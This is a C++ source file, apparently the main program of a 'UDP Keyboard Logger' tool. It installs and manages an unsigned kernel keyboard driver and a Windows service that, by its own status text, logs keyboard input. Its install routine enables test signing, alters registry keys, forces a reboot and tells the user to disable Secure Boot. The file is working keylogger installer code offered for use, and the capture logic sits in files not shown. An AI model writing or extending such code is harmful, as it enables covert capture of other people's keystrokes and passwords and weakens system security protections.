#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <Windows.h>
#include <conio.h>
#include <iostream>
#include "UdpServiceManager.h"
#include "DriverInstaller.h"
#include "SystemStatus.h"

// Helper macros for colored output - changed names to avoid conflicts with Windows API
#define LOG_INFO(fmt, ...) wprintf(L"[INFO] " fmt L"\n", ##__VA_ARGS__)
#define LOG_SUCCESS(fmt, ...) wprintf(L"[SUCCESS] " fmt L"\n", ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...) wprintf(L"[ERROR] " fmt L"\n", ##__VA_ARGS__)

// Reboot helper - uses native Windows API
bool PromptAndReboot(bool forceReboot) {
    if (!forceReboot) {
        // Flush all buffers first
        fflush(stdout);
        
        // Prompt user for confirmation
        wprintf(L"\n");
        wprintf(L"+============================================================+\n");
        wprintf(L"|  System reboot is REQUIRED for changes to take effect.     |\n");
        wprintf(L"+============================================================+\n");
        wprintf(L"\nReboot now? (Y/N): ");
        fflush(stdout);  // Force output immediately
        
        wchar_t response = _getwch();
        wprintf(L"%c\n", response);
        
        if (response != L'Y' && response != L'y') {
            wprintf(L"\nReboot skipped. Please restart manually for changes to take effect.\n");
            return false;
        }
    }
    
    // Enable shutdown privilege
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LOG_ERROR(L"Failed to open process token for reboot");
        return false;
    }
    
    TOKEN_PRIVILEGES tkp;
    LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    
    // Initiate system shutdown with 10 second delay
    std::wcout << L"\n";
    LOG_INFO(L"Initiating system reboot in 10 seconds...");
    
    // Prepare shutdown message (LPWSTR requires non-const)
    wchar_t shutdownMessage[] = L"System restart required for driver installation.";
    
    if (!InitiateSystemShutdownExW(
            nullptr,                                    // Local machine
            shutdownMessage,                            // Non-const message
            10,                                         // 10 second timeout
            TRUE,                                       // Force apps closed
            TRUE,                                       // Reboot after shutdown
            SHTDN_REASON_MAJOR_APPLICATION |            // Application installation
            SHTDN_REASON_MINOR_INSTALLATION |
            SHTDN_REASON_FLAG_PLANNED)) {
        
        LOG_ERROR(L"Failed to initiate system reboot (error: %d)", GetLastError());
        return false;
    }
    
    LOG_SUCCESS(L"System reboot initiated");
    return true;
}

void PrintUsage() {
    std::wcout << L"\n=== UDP Keyboard Logger Service ===" << std::endl;
    std::wcout << L"Built with C++20\n" << std::endl;
    std::wcout << L"Usage:" << std::endl;
    std::wcout << L"  UdpLogger install              # Install service (will prompt for reboot)" << std::endl;
    std::wcout << L"  UdpLogger install --reboot     # Install service and reboot immediately" << std::endl;
    std::wcout << L"  UdpLogger uninstall            # Uninstall service (reboot recommended)" << std::endl;
    std::wcout << L"  UdpLogger status               # Full system status check" << std::endl;
    std::wcout << L"  UdpLogger service start        # Start Windows service" << std::endl;
    std::wcout << L"  UdpLogger service stop         # Stop Windows service" << std::endl;
    std::wcout << L"  UdpLogger service restart      # Restart Windows service" << std::endl;
    std::wcout << L"  UdpLogger service status       # Check Windows service status" << std::endl;
    std::wcout << L"  UdpLogger driver start         # Start kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver stop          # Stop kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver restart       # Restart kernel driver" << std::endl;
    std::wcout << L"  UdpLogger driver status        # Check kernel driver status" << std::endl;
    
#if DEBUG_LOGGING_ENABLED
    std::wcout << L"\n--- Developer/Debug Commands ---" << std::endl;
    std::wcout << L"  UdpLogger --service            # Run as service (internal use)" << std::endl;
    std::wcout << L"  UdpLogger driver-install       # Install driver and library" << std::endl;
    std::wcout << L"  UdpLogger driver-uninstall     # Uninstall driver and library" << std::endl;
#endif
    
    std::wcout << std::endl;
}

int wmain(int argc, wchar_t* argv[]) {
    // Check for --service flag (running as Windows service)
    if (argc >= 2 && wcscmp(argv[1], L"--service") == 0) {
        return UdpServiceManager::RunAsService();
    }
    
    // Interactive mode - require at least one command
    if (argc < 2) {
        PrintUsage();
        return 1;
    }
    
    std::wstring command = argv[1];
    
    // ====================================================================
    // DRIVER/LIBRARY INSTALLATION COMMANDS
    // ====================================================================
    
    if (command == L"driver-install") {
        LOG_INFO(L"Installing driver and library...");
        bool success = DriverInstaller::InstallDriverAndLibrary();
        if (success) {
            LOG_SUCCESS(L"Driver installation completed successfully");
        } else {
            LOG_ERROR(L"Driver installation failed");
        }
        return success ? 0 : 1;
    }

    else if (command == L"driver-uninstall") {
        LOG_INFO(L"Uninstalling driver and library...");
        bool success = DriverInstaller::UninstallDriverAndLibrary();
        if (success) {
            LOG_SUCCESS(L"Driver uninstallation completed successfully");
        } else {
            LOG_ERROR(L"Driver uninstallation failed");
        }
        return success ? 0 : 1;
    }
    
    // ====================================================================
    // FULL SYSTEM STATUS COMMAND
    // ====================================================================
    
    else if (command == L"status") {
        std::wcout << L"\n=== UDP Keyboard Logger - Full System Status ===" << std::endl;
        std::wcout << std::endl;
        
        auto components = SystemStatus::CheckAllComponents();
        
        int issuesCount = 0;
        for (const auto& component : components) {
            std::wcout << (component.status ? L"[+]" : L"[-]");
            std::wcout << L" " << component.name << L": " << component.details << std::endl;
            if (!component.status) {
                issuesCount++;
                if (!component.fixHint.empty()) {
                    std::wcout << L"    → " << component.fixHint << std::endl;
                }
            }
        }
        
        std::wcout << std::endl;
        if (issuesCount == 0) {
            std::wcout << L"Overall Status: FULLY OPERATIONAL" << std::endl;
        } else {
            std::wcout << L"Overall Status: PARTIALLY OPERATIONAL" << std::endl;
            std::wcout << L"Issues detected: " << issuesCount << std::endl;
        }
        
        return 0;
    }
	    // ====================================================================
		// SERVICE MANAGEMENT COMMANDS
		// ====================================================================
    
    else if (command == L"install") {
        // Get current executable path for service installation
        wchar_t exePath[MAX_PATH];
        if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
            LOG_ERROR(L"Failed to get current executable path");
            return 1;
        }

        // ========== SECURE BOOT CHECK - BLOCK INSTALLATION ==========
        if (SystemStatus::CheckSecureBoot()) {
            LOG_ERROR(L"SECURE BOOT IS ENABLED - INSTALLATION BLOCKED");
            std::wcout << L"\n";
            std::wcout << L"+============================================================+\n";
            std::wcout << L"|                   SECURE BOOT DETECTED                    |\n";
            std::wcout << L"+============================================================+\n";
            std::wcout << L"|  Secure Boot is enabled in UEFI/BIOS settings.            |\n";
            std::wcout << L"|  This prevents loading unsigned kernel drivers.           |\n";
            std::wcout << L"|                                                           |\n";
            std::wcout << L"|  REQUIRED ACTION:                                         |\n";
            std::wcout << L"|  1. Enter UEFI/BIOS settings during boot                  |\n";
            std::wcout << L"|  2. Disable Secure Boot                                   |\n";
            std::wcout << L"|  3. Save changes and reboot                               |\n";
            std::wcout << L"|  4. Run installation again                                |\n";
            std::wcout << L"+============================================================+\n";
            std::wcout << L"\n";
            return 1;
        }
        
        // Check for --reboot flag
        bool autoReboot = false;
        if (argc >= 3 && wcscmp(argv[2], L"--reboot") == 0) {
            autoReboot = true;
        }
        
        LOG_INFO(L"Installing UDP Keyboard Logger (full installation)...");
        
        // Step 1: Install drivers and library
        LOG_INFO(L"Step 1/6: Installing drivers...");
        if (!DriverInstaller::InstallDriverAndLibrary()) {
            LOG_ERROR(L"Driver installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Drivers installed");
        
        // Step 2: Install registry keys
        LOG_INFO(L"Step 2/6: Installing registry keys...");
        if (!DriverInstaller::InstallRegistryKeys()) {
            LOG_ERROR(L"Registry installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Registry keys installed");
        
        // Step 3: Enable test signing
        LOG_INFO(L"Step 3/6: Enabling test signing...");
        if (!DriverInstaller::EnableTestSigning()) {
            LOG_ERROR(L"Test signing configuration failed");
            return 1;
        }
        LOG_SUCCESS(L"Test signing enabled (reboot required)");
        
        // Step 4: Register driver service
        LOG_INFO(L"Step 4/6: Registering driver service...");
        if (!DriverInstaller::InstallDriverService()) {
            LOG_ERROR(L"Driver service registration failed");
            return 1;
        }
        LOG_SUCCESS(L"Driver service registered (reboot required)");
        
        // Step 5: Install Windows service
        LOG_INFO(L"Step 5/6: Installing Windows service...");
        if (!UdpServiceManager::InstallService(exePath)) {
            LOG_ERROR(L"Service installation failed");
            return 1;
        }
        LOG_SUCCESS(L"Service installed");
        
        // Step 6: Start service
        LOG_INFO(L"Step 6/6: Starting service...");
        if (UdpServiceManager::StartServiceProcess()) {
            LOG_SUCCESS(L"Service started");
        } else {
            LOG_ERROR(L"Service installed but failed to start");
        }
        
        LOG_SUCCESS(L"Full installation completed successfully");
        
        // Handle reboot
        PromptAndReboot(autoReboot);
        
        return 0;
    }
    
    else if (command == L"uninstall") {
        LOG_INFO(L"Uninstalling UDP Keyboard Logger (complete removal)...");
        
        // Step 1: Stop service
        LOG_INFO(L"Step 1/6: Stopping service...");
        UdpServiceManager::StopServiceProcess();
        LOG_SUCCESS(L"Service stopped");
        
        // Step 2: Uninstall service
        LOG_INFO(L"Step 2/6: Uninstalling Windows service...");
        if (!UdpServiceManager::UninstallService()) {
            LOG_ERROR(L"Service uninstallation failed");
        } else {
            LOG_SUCCESS(L"Service uninstalled");
        }
        
        // Step 3: Restore registry keys
        LOG_INFO(L"Step 3/6: Restoring registry keys...");
        if (!DriverInstaller::UninstallRegistryKeys()) {
            LOG_ERROR(L"Registry restoration failed");
        } else {
            LOG_SUCCESS(L"Registry keys restored");
        }
        
        // Step 4: Disable test signing
        LOG_INFO(L"Step 4/6: Disabling test signing...");
        if (!DriverInstaller::DisableTestSigning()) {
            LOG_ERROR(L"Test signing restoration failed");
        } else {
            LOG_SUCCESS(L"Test signing disabled (reboot required)");
        }
        
        // Step 5: Unregister driver service
        LOG_INFO(L"Step 5/6: Unregistering driver service...");
        if (!DriverInstaller::UninstallDriverService()) {
            LOG_ERROR(L"Driver service unregistration failed");
        } else {
            LOG_SUCCESS(L"Driver service unregistered");
        }
        
        // Step 6: Uninstall drivers
        LOG_INFO(L"Step 6/6: Uninstalling drivers...");
        if (!DriverInstaller::UninstallDriverAndLibrary()) {
            LOG_ERROR(L"Driver uninstallation failed");
        } else {
            LOG_SUCCESS(L"Drivers uninstalled");
        }
        
        LOG_SUCCESS(L"Complete uninstallation finished");
        
        // Reboot recommendation (not required)
        wprintf(L"\n");
        LOG_INFO(L"System reboot is RECOMMENDED to complete removal.");
        
        return 0;
    }
    
    else if (command == L"service") {
        if (argc < 3) {
            LOG_ERROR(L"Missing service command: start, stop, restart, status");
            return 1;
        }
        
        std::wstring subCmd = argv[2];
        
        if (subCmd == L"start") {
            LOG_INFO(L"Starting UDP Keyboard Logger service...");
            bool result = UdpServiceManager::StartServiceProcess();
            if (result) {
                std::wcout << L"[+] Service started successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start service" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"stop") {
            LOG_INFO(L"Stopping UDP Keyboard Logger service...");
            bool result = UdpServiceManager::StopServiceProcess();
            if (result) {
                std::wcout << L"[+] Service stopped successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop service" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"restart") {
            LOG_INFO(L"Restarting UDP Keyboard Logger service...");
            
            LOG_INFO(L"Stopping service...");
            bool stopped = UdpServiceManager::StopServiceProcess();
            if (stopped) {
                std::wcout << L"[+] Service stopped" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop service" << std::endl;
            }
            
            Sleep(1000);
            
            LOG_INFO(L"Starting service...");
            bool started = UdpServiceManager::StartServiceProcess();
            if (started) {
                std::wcout << L"[+] Service started" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start service" << std::endl;
            }
            
            return (stopped && started) ? 0 : 1;
            
        } else if (subCmd == L"status") {
            LOG_INFO(L"Checking UDP Keyboard Logger service status...");
            
            const bool installed = UdpServiceManager::IsServiceInstalled();
            const bool running = installed ? UdpServiceManager::IsServiceRunning() : false;
            
            std::wcout << L"\n=== Windows Service Status ===" << std::endl;
            std::wcout << L"Name: UdpKeyboardLogger" << std::endl;
            std::wcout << L"Display Name: UDP Keyboard Logger Service" << std::endl;
            std::wcout << std::endl;
            
            if (installed) {
                std::wcout << (running ? L"[+]" : L"[-]");
                std::wcout << L" Installation Status: INSTALLED" << std::endl;
                std::wcout << (running ? L"[+]" : L"[-]"); 
                std::wcout << L" Runtime Status: " << (running ? L"RUNNING" : L"STOPPED") << std::endl;
                
                if (running) {
                    std::wcout << L"[+] Service is operational and logging UDP keyboard input" << std::endl;
                } else {
                    std::wcout << L"    → Use 'UdpLogger service start' to start the service" << std::endl;
                }
            } else {
                std::wcout << L"[-] Installation Status: NOT INSTALLED" << std::endl;
                std::wcout << L"    → Use 'UdpLogger install' to install the service first" << std::endl;
            }
            
            std::wcout << std::endl;
            return 0;
            
        } else {
            LOG_ERROR(L"Unknown service command: %s", subCmd.c_str());
            PrintUsage();
            return 1;
        }
    }
    
    // ====================================================================
    // DRIVER MANAGEMENT COMMANDS
    // ====================================================================
    
    else if (command == L"driver") {
        if (argc < 3) {
            LOG_ERROR(L"Missing driver command: start, stop, restart, status");
            return 1;
        }
        
        std::wstring subCmd = argv[2];
        
        if (subCmd == L"start") {
            LOG_INFO(L"Starting kvckbd kernel driver...");
            bool result = UdpServiceManager::StartDriverService();
            if (result) {
                std::wcout << L"[+] Driver started successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to start driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"stop") {
            LOG_INFO(L"Stopping kvckbd kernel driver...");
            bool result = UdpServiceManager::StopDriverService();
            if (result) {
                std::wcout << L"[+] Driver stopped successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to stop driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"restart") {
            LOG_INFO(L"Restarting kvckbd kernel driver...");
            bool result = UdpServiceManager::RestartDriverService();
            if (result) {
                std::wcout << L"[+] Driver restarted successfully" << std::endl;
            } else {
                std::wcout << L"[-] Failed to restart driver" << std::endl;
            }
            return result ? 0 : 1;
            
        } else if (subCmd == L"status") {
            bool isRunning = UdpServiceManager::IsDriverServiceRunning();
            std::wcout << L"\n=== Kernel Driver Status ===" << std::endl;
            std::wcout << L"Driver: kvckbd.sys" << std::endl;
            std::wcout << L"Status: " << (isRunning ? L"RUNNING" : L"STOPPED") << std::endl;
            std::wcout << std::endl;
            
            if (isRunning) {
                std::wcout << L"[+] Driver is loaded and operational" << std::endl;
            } else {
                std::wcout << L"[-] Driver is not running" << std::endl;
                std::wcout << L"    → Run 'UdpLogger driver start' to start it" << std::endl;
            }
            return 0;
            
        } else {
            LOG_ERROR(L"Unknown driver command: %s", subCmd.c_str());
            PrintUsage();
            return 1;
        }
    }
    
    else {
        LOG_ERROR(L"Unknown command: %s", command.c_str());
        PrintUsage();
        return 1;
    }
    
    return 0;
}